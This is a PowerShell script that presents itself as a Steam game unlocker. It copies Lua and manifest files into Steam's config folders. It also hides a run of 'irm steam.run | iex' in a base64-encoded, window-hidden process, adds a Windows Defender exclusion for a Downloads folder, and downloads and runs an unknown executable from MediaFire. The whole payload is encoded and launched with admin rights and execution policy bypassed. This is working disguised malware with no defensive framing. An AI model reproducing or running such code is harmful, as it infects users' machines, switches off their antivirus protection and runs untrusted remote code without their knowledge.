$script = @'
$steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction SilentlyContinue).InstallPath
if (-not $steamPath) {      exit }
$zipUrl = "https://www.mediafire.com/file/933eoxmje7r09rb/2juegos_gtaspiderman.zip/file"
$tempZip = "$env:TEMP\1172620.zip"
$extractPath = "$env:TEMP\1172620_extract"
$luaDest = Join-Path $steamPath "config\stplug-in"
$manifestDest = Join-Path $steamPath "config\depotcache"
New-Item -ItemType Directory -Force -Path $luaDest | Out-Null
New-Item -ItemType Directory -Force -Path $manifestDest | Out-Null
New-Item -ItemType Directory -Force -Path $extractPath | Out-Null
function Get-MediaFireDirectLink($url) {
$html = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
if ($html -match 'href="(https://download[^"]+)"') {         return $matches[1]     }     return $null }
if ($zipUrl -like "*mediafire.com*") {
$direct = Get-MediaFireDirectLink $zipUrl
if(!$direct){          exit     }
Start-BitsTransfer -Source $direct -Destination $tempZip }
else {
Start-BitsTransfer -Source $zipUrl -Destination $tempZip }
if(!(Test-Path $tempZip)){      exit }
Expand-Archive -Path $tempZip -DestinationPath $extractPath -Force
Get-ChildItem -Path $extractPath -Recurse -Filter *.lua | ForEach-Object {
Copy-Item $_.FullName -Destination $luaDest -Force  }
Get-ChildItem -Path $extractPath -Recurse -Filter *.manifest | ForEach-Object {
Copy-Item $_.FullName -Destination $manifestDest -Force  }
Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue  # Ejecutar steam.run en un proceso en segundo plano sin ventana visible
$steamRunScript = "irm steam.run | iex"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($steamRunScript)
$encoded = [Convert]::ToBase64String($bytes)
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded"
$targetDir="$env:USERPROFILE\Downloads\BastisssPrograma"
if(!(Test-Path $targetDir)){
New-Item $targetDir -ItemType Directory | Out-Null }  try{
Add-MpPreference -ExclusionPath $targetDir  } catch{}
$zipPath=Join-Path $targetDir "Bastisss1.8_UR.zip"
$pageUrl="https://www.mediafire.com/file/3gc7kn1txrg156s/Bastisss1.8_UR.zip/file"
$link=(iwr $pageUrl -UseBasicParsing).Content | sls 'https://download[^"]+' -AllMatches | %{$_.Matches.Value} | select -First 1
if(!$link){
explorer $targetDir     exit }
Start-BitsTransfer $link $zipPath
if(!(Test-Path $zipPath)){
explorer $targetDir     exit }
if((gi $zipPath).Length -lt 1MB){
explorer $targetDir     exit }
Expand-Archive -Path $zipPath -DestinationPath $targetDir -Force
Remove-Item $zipPath -Force
$exeFile =
Get-ChildItem $targetDir -Recurse -File | Where-Object { $_.Name -match '(?i)bastisss.*\.exe' } | Select-Object -First 1
if($exeFile){
Start-Process $exeFile.FullName }
else {
explorer $targetDir }
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
Start-Process powershell -Verb runAs -ArgumentList "-ExecutionPolicy Bypass -EncodedCommand $encoded"